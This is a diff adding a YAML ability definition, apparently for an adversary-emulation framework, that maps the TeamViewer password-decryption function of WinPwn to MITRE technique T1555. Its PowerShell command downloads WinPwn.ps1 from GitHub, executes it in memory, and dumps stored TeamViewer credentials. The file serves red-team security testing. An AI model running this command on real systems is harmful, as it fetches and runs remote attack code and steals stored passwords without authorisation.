@@ -1,0 +1,19 @@
+---
+- id: b29f6c6ba7bb6dd0aaa2082db126dbab
+  name: WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords
+  description: Loot local Credentials - Decrypt Teamviewer Passwords technique via
+    function of WinPwn
+  tactic: credential-access
+  technique:
+    attack_id: T1555
+    name: Credentials from Password Stores
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          decryptteamviewer -consoleoutput -noninteractive
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
